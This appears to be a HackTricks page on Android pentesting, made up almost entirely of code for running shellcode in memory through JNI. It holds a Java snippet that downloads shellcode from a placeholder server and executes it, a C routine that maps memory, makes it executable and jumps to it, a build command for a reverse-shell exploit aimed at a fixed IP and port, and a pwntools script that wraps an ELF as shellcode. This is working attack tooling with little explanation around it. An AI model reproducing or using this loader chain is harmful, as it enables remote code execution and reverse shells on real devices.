---
title: "In Memory Jni Shellcode Execution"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/mobile-pentesting/android-app-pentesting/in-memory-jni-shellcode-execution.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: mobile/android
---

# Android In-Memory Native Code Execution via JNI (shellcode)

```
public final class NativeExec {
    static { System.loadLibrary("nativeexec"); }
    public static native int run(byte[] sc);
}
// Download and execute (simplified)
byte[] sc = new java.net.URL("https://your-server/sc").openStream().readAllBytes();
int rc = NativeExec.run(sc);
```
```
#include <jni.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
static inline void flush_icache(void *p, size_t len) {
    __builtin___clear_cache((char*)p, (char*)p + len);
}
JNIEXPORT jint JNICALL
Java_com_example_NativeExec_run(JNIEnv *env, jclass cls, jbyteArray sc) {
    jsize len = (*env)->GetArrayLength(env, sc);
    if (len <= 0) return -1;
    // RW anonymous buffer
    void *buf = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) return -2;
    jboolean isCopy = 0;
    jbyte *bytes = (*env)->GetByteArrayElements(env, sc, &isCopy);
    if (!bytes) { munmap(buf, len); return -3; }
    memcpy(buf, bytes, len);
    (*env)->ReleaseByteArrayElements(env, sc, bytes, JNI_ABORT);
    // Make RX and execute
    if (mprotect(buf, len, PROT_READ | PROT_EXEC) != 0) { munmap(buf, len); return -4; }
    flush_icache(buf, len);
    int (*entry)(void) = (int (*)(void))buf;
    int ret = entry();
    // Optional: restore RW and wipe
    mprotect(buf, len, PROT_READ | PROT_WRITE);
    memset(buf, 0, len);
    munmap(buf, len);
    return ret;
}
```
```
# amd64 emulator example; use an AArch64 cross-compiler for arm64 devices
musl-gcc -O3 -s -static -fno-pic -o exploit exploit.c \
  -DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
```
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
loader = shellcraft.amd64.linux.loader_append(elf.data)
sc = asm(loader)
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)}, shellcode size={len(sc)}")
```
## References
